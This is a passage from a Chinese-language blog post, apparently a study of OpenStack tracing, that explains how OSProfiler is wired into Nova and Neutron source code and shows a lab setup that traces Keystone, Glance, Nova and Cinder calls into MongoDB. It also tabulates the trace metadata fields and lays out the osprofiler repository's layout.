class="title">deserialize_context</span>(<span class="params">self, context</span>):</span></span><br><span class="line">        trace_info = context.pop(<span class="string">&quot;trace_info&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> trace_info:</span><br><span class="line">            profiler.init(**trace_info)     <span class="comment"># 初始新的化 osprofiler 实例</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>(ProfilerRequestContextSerializer,</span><br><span class="line">                     self).deserialize_context(context)</span><br></pre></td></tr></table></figure><p><code>nova/utils.py</code> 实现 spawn 和 spawn_n 装饰器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回追踪信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_serialize_profile_info</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> profiler:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    prof = profiler.get()   <span class="comment"># 获取实例</span></span><br><span class="line">    trace_info = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> prof:</span><br><span class="line">        <span class="comment"># FIXME(DinaBelova): we&#x27;ll add profiler.get_info() method</span></span><br><span class="line">        <span class="comment"># to extract this info -&gt; we&#x27;ll need to update these lines</span></span><br><span class="line">        trace_info = &#123;</span><br><span class="line">            <span class="string">&quot;hmac_key&quot;</span>: prof.hmac_key,</span><br><span class="line">            <span class="string">&quot;base_id&quot;</span>: prof.get_base_id(),</span><br><span class="line">            <span class="string">&quot;parent_id&quot;</span>: prof.get_id()</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> trace_info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Passthrough method for eventlet.spawn.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This utility exists so that it can be stubbed for testing without</span></span><br><span class="line"><span class="string">    interfering with the service spawns.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    It will also grab the context from the threadlocal store and add it to</span></span><br><span class="line"><span class="string">    the store on the new thread.  This allows for continuity in logging the</span></span><br><span class="line"><span class="string">    context when using this method to spawn a new thread.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    _context = common_context.get_current()     <span class="comment"># 当前线程</span></span><br><span class="line">    profiler_info = _serialize_profile_info()   <span class="comment"># 追踪信息</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">context_wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="comment"># <span class="doctag">NOTE:</span> If update_store is not called after spawn it won&#x27;t be</span></span><br><span class="line">        <span class="comment"># available for the logger to pull from threadlocal storage.</span></span><br><span class="line">        <span class="keyword">if</span> _context <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            _context.update_store()</span><br><span class="line">        <span class="keyword">if</span> profiler_info <span class="keyword">and</span> profiler:</span><br><span class="line">            profiler.init(**profiler_info)      <span class="comment"># 初始化 osprofiler 实例</span></span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventlet.spawn(context_wrapper, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn_n</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Passthrough method for eventlet.spawn_n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This utility exists so that it can be stubbed for testing without</span></span><br><span class="line"><span class="string">    interfering with the service spawns.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    It will also grab the context from the threadlocal store and add it to</span></span><br><span class="line"><span class="string">    the store on the new thread.  This allows for continuity in logging the</span></span><br><span class="line"><span class="string">    context when using this method to spawn a new thread.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    _context = common_context.get_current()</span><br><span class="line">    profiler_info = _serialize_profile_info()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">context_wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="comment"># <span class="doctag">NOTE:</span> If update_store is not called after spawn_n it won&#x27;t be</span></span><br><span class="line">        <span class="comment"># available for the logger to pull from threadlocal storage.</span></span><br><span class="line">        <span class="keyword">if</span> _context <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            _context.update_store()</span><br><span class="line">        <span class="keyword">if</span> profiler_info <span class="keyword">and</span> profiler:</span><br><span class="line">            profiler.init(**profiler_info)</span><br><span class="line">        func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    eventlet.spawn_n(context_wrapper, *args, **kwargs)</span><br></pre></td></tr></table></figure><p><code>nova/db/sqlalchemy/api.py</code> 添加数据库追踪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 追踪数据库调用</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">configure</span>(<span class="params">conf</span>):</span></span><br><span class="line">    main_context_manager.configure(**_get_db_conf(conf.database))</span><br><span class="line">    api_context_manager.configure(**_get_db_conf(conf.api_database))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> profiler_sqlalchemy <span class="keyword">and</span> CONF.profiler.enabled \</span><br><span class="line">            <span class="keyword">and</span> CONF.profiler.trace_sqlalchemy:</span><br><span class="line"></span><br><span class="line">        main_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># 添加追踪</span></span><br><span class="line">        api_context_manager.append_on_engine_create(</span><br><span class="line">            <span class="keyword">lambda</span> eng: profiler_sqlalchemy.add_tracing(sa, eng, <span class="string">&quot;db&quot;</span>))     <span class="comment"># 添加追踪</span></span><br></pre></td></tr></table></figure><h2 id="Neutron"><a href="#Neutron" class="headerlink" title="Neutron"></a>Neutron</h2><p>相关文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">neutron/manager.py          <span class="comment"># 元类</span></span><br><span class="line">neutron/common/profiler.py  <span class="comment"># 根据配置文件设置驱动，启用 WSGI 中间件</span></span><br><span class="line">neutron/common/utils.py     <span class="comment"># spawn/spawn_n 装饰器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用 neutron/common/profiler.py 设置 OSProfiler</span></span><br><span class="line">neutron/service.py</span><br><span class="line">neutron/server/__init__.py</span><br><span class="line">neutron/plugins/ml2/drivers/openvswitch/agent/main.py</span><br><span class="line">neutron/plugins/ml2/drivers/linuxbridge/agent/linuxbridge_neutron_agent.py</span><br><span class="line">neutron/plugins/ml2/drivers/mec_sriov/agent/sriov_nic_agent.py</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用类装饰器 @profiler.trace_cls(&quot;&quot;)</span></span><br><span class="line">neutron/agent/l3/agent.py   <span class="comment"># l3-agent</span></span><br><span class="line">neutron/plugins/ml2/drivers/openvswitch/agent/ovs_dvr_neutron_agent.py  <span class="comment"># ovs_dvr_agent</span></span><br><span class="line">neutron/plugins/ml2/drivers/agent/_common_agent.py  <span class="comment"># rpc</span></span><br><span class="line">neutron/plugins/ml2/drivers/mec_sriov/agent/sriov_nic_agent.py  <span class="comment"># rpc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数装饰器 @profiler.trace(&quot;&quot;)</span></span><br><span class="line">neutron/plugins/ml2/drivers/openvswitch/agent/ovs_neutron_agent.py  <span class="comment"># rpc</span></span><br><span class="line">neutron/plugins/ml2/rpc.py  <span class="comment"># rpc</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># cProfile</span></span><br><span class="line">conf/profiling.py</span><br><span class="line">neutron/profiling/profiled_decorator.py</span><br></pre></td></tr></table></figure><p><code>neutron/manager.py</code> 和 Nova 同样的实现思路，使用元类实现类追踪</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 元类</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ManagerMeta</span>(<span class="params">profiler.TracedMeta, <span class="built_in">type</span>(<span class="params">periodic_task.PeriodicTasks</span>)</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 继承</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Manager</span>(<span class="params">periodic_task.PeriodicTasks, metaclass=ManagerMeta</span>):</span></span><br><span class="line">    __trace_args__ = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;rpc&quot;</span>&#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>neutron/common/profiler.py</code> 启用 OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setup</span>(<span class="params">name, host=<span class="string">&#x27;0.0.0.0&#x27;</span></span>):</span>  <span class="comment"># nosec</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Setup OSprofiler notifier and enable profiling.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    :param name: name of the service, that will be profiled</span></span><br><span class="line"><span class="string">    :param host: host (either host name or host address) the service will be</span></span><br><span class="line"><span class="string">                 running on. By default host will be set to 0.0.0.0, but more</span></span><br><span class="line"><span class="string">                 specified host name / address usage is highly recommended.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> CONF.profiler.enabled:</span><br><span class="line">        osprofiler.initializer.init_from_conf(      <span class="comment"># 启用 OSProfiler</span></span><br><span class="line">            conf=CONF,</span><br><span class="line">            context=context.get_admin_context().to_dict(),</span><br><span class="line">            project=<span class="string">&quot;neutron&quot;</span>,</span><br><span class="line">            service=name,</span><br><span class="line">            host=host</span><br><span class="line">        )</span><br><span class="line">        LOG.info(<span class="string">&quot;OSProfiler is enabled.\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;Traces provided from the profiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;can only be subscribed to using the same HMAC keys that &quot;</span></span><br><span class="line">                 <span class="string">&quot;are configured in Neutron&#x27;s configuration file &quot;</span></span><br><span class="line">                 <span class="string">&quot;under the [profiler] section.\n To disable OSprofiler &quot;</span></span><br><span class="line">                 <span class="string">&quot;set in /etc/neutron/neutron.conf:\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;[profiler]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;enabled=false&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>neutron/common/utils.py</code> 返回追踪信息，实现 spawn 和 spawn_n 装饰器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回追踪信息</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">collect_profiler_info</span>():</span></span><br><span class="line">    p = profiler.get()</span><br><span class="line">    <span class="keyword">if</span> p:</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;hmac_key&quot;</span>: p.hmac_key,</span><br><span class="line">            <span class="string">&quot;base_id&quot;</span>: p.get_base_id(),</span><br><span class="line">            <span class="string">&quot;parent_id&quot;</span>: p.get_id(),</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;As eventlet.spawn() but with osprofiler initialized in the new threads</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    osprofiler stores the profiler instance in thread local storage, therefore</span></span><br><span class="line"><span class="string">    in new threads (including eventlet threads) osprofiler comes uninitialized</span></span><br><span class="line"><span class="string">    by default. This spawn() is a stand-in replacement for eventlet.spawn()</span></span><br><span class="line"><span class="string">    but we re-initialize osprofiler in threads spawn()-ed.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    profiler_info = collect_profiler_info()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler_info:</span><br><span class="line">            profiler.init(**profiler_info)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventlet.spawn(wrapper, *args, **kwargs)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 装饰器</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spawn_n</span>(<span class="params">func, *args, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;See spawn() above&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    profiler_info = collect_profiler_info()</span><br><span class="line"></span><br><span class="line"><span class="meta">    @functools.wraps(<span class="params">func</span>)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">        <span class="keyword">if</span> profiler_info:</span><br><span class="line">            profiler.init(**profiler_info)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> eventlet.spawn_n(wrapper, *args, **kwargs)</span><br></pre></td></tr></table></figure><p><code>neutron/server/__init__.py</code> 启用 OSProfiler</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_application</span>():</span></span><br><span class="line">    _init_configuration()</span><br><span class="line">    profiler.setup(<span class="string">&#x27;neutron-server&#x27;</span>, cfg.CONF.host)     <span class="comment"># 启用 OSProfiler</span></span><br><span class="line">    <span class="keyword">return</span> config.load_paste_app(<span class="string">&#x27;neutron&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="OSProfiler-使用"><a href="#OSProfiler-使用" class="headerlink" title="OSProfiler 使用"></a>OSProfiler 使用</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>在 <a href="https://jckling.github.io/2020/12/25/OpenStack/CentOS7+OpenStack(Rocky)-0/">CentOS 7 安装 Openstack Rocky 版本 - 环境搭建</a> 一系列文章的基础上进行实验，整体架构如下：</p><img src="https://i.loli.net/2021/06/06/R5mAHUtLlM1eyhb.jpg"><p>修改控制节点上相关组件的配置文件，启用 OSProfiler </p><p>Controller</p><ul><li>Keystone</li><li>Glance</li><li>Nova*</li><li>Neutron*</li><li>Cinder</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[profiler]</span><br><span class="line">enabled &#x3D; True</span><br><span class="line"></span><br><span class="line">trace_sqlalchemy &#x3D; True</span><br><span class="line">trace_wsgi_transport  &#x3D; True</span><br><span class="line">trace_message_store  &#x3D; True</span><br><span class="line">trace_management_store  &#x3D; True</span><br><span class="line"></span><br><span class="line">hmac_keys &#x3D; 123</span><br><span class="line"></span><br><span class="line">connection_string &#x3D; mongodb:&#x2F;&#x2F;10.112.116.249:27017</span><br></pre></td></tr></table></figure><p>使用 MongoDB 作为后端，如果用 Elasticsearch 或 Jaeger 会产生错误，暂时没有找到解决方案，可能是版本不兼容。</p><img src="https://i.loli.net/2021/06/06/Gm1ycfj5qprEzBD.png" width="80%"><p>在 Gateway 上使用 Docker 部署 MongoDB ，存储追踪信息。</p><img src="https://i.loli.net/2021/06/06/x7PacO2MGholgHu.png"><h2 id="追踪服务组件"><a href="#追踪服务组件" class="headerlink" title="追踪服务组件"></a>追踪服务组件</h2><p>显式指定追踪的调用命令</p><h3 id="Keystone-1"><a href="#Keystone-1" class="headerlink" title="Keystone"></a>Keystone</h3><p>身份认证服务，列出所有用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清除临时环境变量</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关权限认证</span></span><br><span class="line">. admin-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出所有用户</span></span><br><span class="line">openstack user list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出 html 文件</span></span><br><span class="line">osprofiler trace show --html fdfa1e7a-0863-470b-8ae2-169b21b0fbe5 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test1.html&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Glance-1"><a href="#Glance-1" class="headerlink" title="Glance"></a>Glance</h3><p>镜像服务，列出可用镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清除临时环境变量</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关权限认证</span></span><br><span class="line">. demo-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出可用镜像</span></span><br><span class="line">openstack image list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出 html 文件</span></span><br><span class="line">osprofiler trace show --html 04c4f7b5-e22f-40f7-8248-162247642cb5 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test2.html&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Nova-1"><a href="#Nova-1" class="headerlink" title="Nova"></a>Nova</h3><p>计算服务，查询实例状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清除临时环境变量</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关权限认证</span></span><br><span class="line">. demo-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看实例</span></span><br><span class="line">openstack server list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出 html 文件</span></span><br><span class="line">osprofiler trace show --html 8cce121c-adf1-4061-96eb-950bb4a75db8 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test3.html&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Cinder-1"><a href="#Cinder-1" class="headerlink" title="Cinder"></a>Cinder</h3><p>卷服务，查看卷状态</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 清除临时环境变量</span></span><br><span class="line"><span class="built_in">unset</span> OS_AUTH_URL OS_PASSWORD</span><br><span class="line"></span><br><span class="line"><span class="comment"># 相关权限认证</span></span><br><span class="line">. demo-openrc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看卷</span></span><br><span class="line">openstack volume list --os-profile 123</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导出 html 文件</span></span><br><span class="line">osprofiler trace show --html 71760b3d-df04-4fec-bc26-dfc9b909f518 --connection-string <span class="string">&quot;mongodb://10.112.116.249:27017&quot;</span> --out <span class="string">&quot;test4.html&quot;</span></span><br></pre></td></tr></table></figure><h2 id="元数据分析"><a href="#元数据分析" class="headerlink" title="元数据分析"></a>元数据分析</h2><p>trace point 可以理解为 span</p><table><thead><tr><th>字段</th><th>格式</th><th>含义</th></tr></thead><tbody><tr><td>info</td><td><code>&lt;dict&gt;</code></td><td>在调用 profiler 的 <code>start()</code> 和 <code>stop()</code> 方法时传递的用户信息，数据库语句、请求参数等</td></tr><tr><td>name</td><td>`<point_name>-(start</td><td>stop)`</td></tr><tr><td>service</td><td><code>&lt;service_name&gt;</code></td><td>public / api / osapi_compute</td></tr><tr><td>timestamp</td><td><code>&lt;timestamp&gt;</code></td><td>时间戳</td></tr><tr><td>trace_id</td><td><code>&lt;uuid&gt;</code></td><td>当前追踪点id</td></tr><tr><td>project</td><td><code>&lt;project_name&gt;</code></td><td>服务组件</td></tr><tr><td>parent_id</td><td><code>&lt;uuid&gt;</code></td><td>父级追踪点id</td></tr><tr><td>base_id</td><td><code>&lt;uuid&gt;</code></td><td>所有属于一条追踪链的追踪点都拥有相同的id</td></tr></tbody></table><h1 id="OSProfiler-源码分析"><a href="#OSProfiler-源码分析" class="headerlink" title="OSProfiler 源码分析"></a>OSProfiler 源码分析</h1><p>用 git 拉取源码 <a href="https://github.com/openstack/osprofiler">openstack/osprofiler</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">├─devstack    <span class="comment"># DevStack 脚本，安装和配置 osprofiler</span></span><br><span class="line">├─doc         <span class="comment"># 文档</span></span><br><span class="line">├─osprofiler  <span class="comment"># 主要代码</span></span><br><span class="line">│  │  exc.py          <span class="comment"># cmd 错误类</span></span><br><span class="line">│  │  initializer.py  <span class="comment"># （读取配置文件）初始化</span></span><br><span class="line">│  │  notifier.py     <span class="comment"># 通知消息</span></span><br><span class="line">│  │  opts.py         <span class="comment"># 配置选项</span></span><br><span class="line">│  │  profiler.py     <span class="comment"># osprofiler 实例，函数/类装饰器，元数据类</span></span><br><span class="line">│  │  sqlalchemy.py   <span class="comment"># 追踪数据库调用</span></span><br><span class="line">│  │  web.py          <span class="comment"># 追踪 WSGI 调用</span></span><br><span class="line">│  │  _utils.py       <span class="comment"># 工具函数</span></span><br><span class="line">│  │  __init__.py</span><br><span class="line">│  ├─cmd      <span class="comment"># cmd 接口</span></span><br><span class="line">│  │      cliutils.py   <span class="comment"># 参数装饰、绑定</span></span><br><span class="line">│  │      commands.py   <span class="comment"># 显示和保存指定跟踪（html/json/dot），列出所有跟踪</span></span><br><span class="line">│  │      shell.py      <span class="comment"># 处理命令行</span></span><br><span class="line">│  │      template.html <span class="comment"># html 模板</span></span><br><span class="line">│  │      __init__.py</span><br><span class="line">│  ├─drivers  <span class="comment"># 驱动</span></span><br><span class="line">│  │      base.py   <span class="comment"># 基类</span></span><br><span class="line">│  │      elasticsearch_driver.py</span><br><span class="line">│  │      jaeger.py</span><br><span class="line">│  │      loginsight.py</span><br><span class="line">│  │      messaging.py</span><br><span class="line">│  │      mongodb.py</span><br><span class="line">│  │      redis_driver.py</span><br><span class="line">│  │      sqlalchemy_driver.py</span><br><span class="line">│  │      __init__.py</span><br><span class="line">│  ├─hacking  <span class="comment"># 针对 osprofiler 编写的测试</span></span><br><span class="line">│  └─tests    <span class="comment"># 测试</span></span><br><span class="line">├─playbooks     <span class="comment"># Ansible 剧本</span></span><br><span class="line">├─releasenotes  <span class="comment"># 发行说明</span></span><br><span class="line">└─tools         <span class="comment"># 代码风格检查，tox 虚拟环境</span></span><br></pre></td></tr></table></figure><p><strong>_utils.py（工具函数）</strong></p><ul><li>私有模块</li><li>公有函数</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 